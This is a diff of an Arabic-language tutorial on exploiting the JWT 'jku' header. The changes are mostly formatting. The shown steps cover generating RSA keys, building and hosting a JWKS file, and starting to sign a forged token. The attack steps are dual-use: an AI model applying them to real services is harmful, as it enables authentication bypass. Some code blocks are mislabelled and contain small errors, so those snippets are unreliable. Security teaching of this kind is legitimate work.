@@ -65,13 +65,16 @@ http://localhost:3000/.well-known/jwks.json
 
 jkuلأننا ماندري المبرمج كيف قاعد ياخذ قيمة الـ 
 
-### `Exploitation:`
+### Exploitation:
 - بالفورمات المناسب Private/Public keys أول خطوة نروح للسيرفر الخاص فينا ونسوي 
+
 ```ssh-keygen -t rsa -b 4096 -m PEM -f id_rsa```
+
 ```openssl rsa -in id_rsa -pubout -outform PEM -out id_rsa.pub```
 
--  راح أشرح طريقتين لعمل هالشي JWKS بعدين الـ JWK الآن نسوي الـ 
+-  راح أشرح طريقتين لعمل هالشي JWKS بعدين الـ JWK الخطوة الثانية نسوي الـ 
 : rsa-pem-to-jwk library الطريقة الأولى بإستخدام
+
 ```python
 const fs = require('fs')
 const jwk = require('rsa-pem-to-jwk')
@@ -82,9 +85,11 @@ const privateKey = fs.readFileSync(__dirname +'/keys/id_rsa'); //Private_Key Pat
 const jwk = jwk(privateKey, {use: 'sig'}, 'public')
 console.log(jwk)
 ```
+
 الناتج راح يكون زي ماشفنا في بداية اﻵرتكل
 
 بعدها كل اللي علينا ناخذ الناتج هذا 
+
 
 ```python
 {
@@ -108,7 +113,7 @@ Keys Array ونحطه بـ
 "e": "AQAB"
 
 	}
-		]
+	]
 }
 ```
 jwks.json ونحفظه بملف 
@@ -118,12 +123,15 @@ jwks.json ونحفظه بملف
 as convention only طبعا المسميات هذي كلها 
 
  جاهز ومرفوع على سيرفرنا الخاصJWKS وبكذا صار عندنا الـ
+
 http://localhost:3000/.well-known/jwks.json
 
 الطريقة الثانية أسهل, عن طريق موقع
+ 
  https://russelldavies.github.io/jwk-creator/ 
 
 - JWT الخطوة الثالثة فالاتاك نسوي الـ 
+
 ```python
 const fs = require('fs');
 const JWT = require('jsonwebtoken');
